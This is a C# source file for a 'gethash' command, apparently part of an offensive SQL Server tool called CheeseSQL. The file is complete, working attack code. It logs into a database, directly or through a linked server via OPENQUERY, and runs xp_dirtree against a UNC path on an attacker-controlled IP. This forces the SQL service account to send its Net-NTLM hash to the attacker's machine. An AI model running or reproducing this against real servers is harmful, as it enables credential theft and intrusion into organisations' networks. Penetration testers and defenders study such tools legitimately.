using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace CheeseSQL.Commands
{
    public class gethash : ICommand
    {
        public static string CommandName => "gethash";
        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Retrieve Net-NTLM Hash for Service Account from a directly accessible DB or Linked SQL Server";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} /db:DATABASE /server:SERVER /ip:ATTACKERIP /target:SERVER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {

            string user = "";
            string password = "";
            string connectInfo = "";
            string database = "";
            string connectserver = "";
            string ip = "";
            bool sqlauth = false;
            string target = "";

            if (arguments.ContainsKey("/sqlauth"))
            {
                sqlauth = true;
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/ip"))
            {
                ip = arguments["/ip"];
            }
            if (arguments.ContainsKey("/target"))
            {
                target = arguments["/target"];
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(ip))
            {
                Console.WriteLine("\r\n[X] You must supply the IP address of your attack box!\r\n");
                return;
            }

            if (sqlauth)
            {
                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/password"))
                {
                    password = arguments["/password"];
                }
                if (String.IsNullOrEmpty(user))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(password))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
                    return;
                }
                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
            }
            else
            {
                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            }

            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                return;
            }

            string queryUNC = $"EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";";
            if (!String.IsNullOrEmpty(target))
            {
                queryUNC = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";');";
            }
            SqlCommand command = new SqlCommand(queryUNC, connection);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            connection.Close();

            connection.Close();
        }
    }
}
